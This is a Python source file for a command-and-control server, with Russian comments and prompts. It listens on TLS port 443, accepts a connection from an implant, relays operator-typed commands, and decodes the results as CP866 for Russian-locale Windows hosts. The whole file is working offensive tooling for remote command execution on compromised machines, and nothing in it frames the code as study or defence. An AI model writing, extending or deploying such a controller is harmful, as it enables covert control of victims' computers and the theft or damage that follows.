import ssl
import socket
import time

def start_c2_server():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="tls/keys/server.crt", keyfile="tls/keys/server.key")
    context.minimum_version = ssl.TLSVersion.TLSv1_2

    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket = context.wrap_socket(raw_socket, server_side=True)

    server_socket.bind(("0.0.0.0", 443))
    server_socket.listen(5)

    print("C2-сервер запущен, ожидание подключения...")

    conn = None
    try:
        conn, addr = server_socket.accept()
        print(f"[+] Клиент подключен: {addr}")

        while True:
            command = input("Введите команду (или 'exit' для завершения): ").strip()
            if not command:
                continue

            conn.send((command + "\n").encode())

            if command.lower() == "exit":
                print("Закрываю соединение...")
                time.sleep(1)
                break

            output = b""
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                output += data
                if output.endswith(b"CMD_COMPLETE"):
                    output = output[:-12]  # Убираем маркер
                    break

            try:
     # Пытаемся декодировать как CP866 (русская версия Windows)
                decoded_output = output.decode('cp866')
            except UnicodeDecodeError:
     # Если не получается, игнорируем ошибки или пробуем другую кодировку
                decoded_output = output.decode(errors="ignore")
            print(decoded_output)

    except KeyboardInterrupt:
        print("\n[!] Сервер остановлен вручную")
    except Exception as e:
        print(f"[!] Ошибка: {e}")
    finally:
        if conn:
            conn.close()
        server_socket.close()
        print("Сервер завершил работу")

if __name__ == "__main__":
    start_c2_server()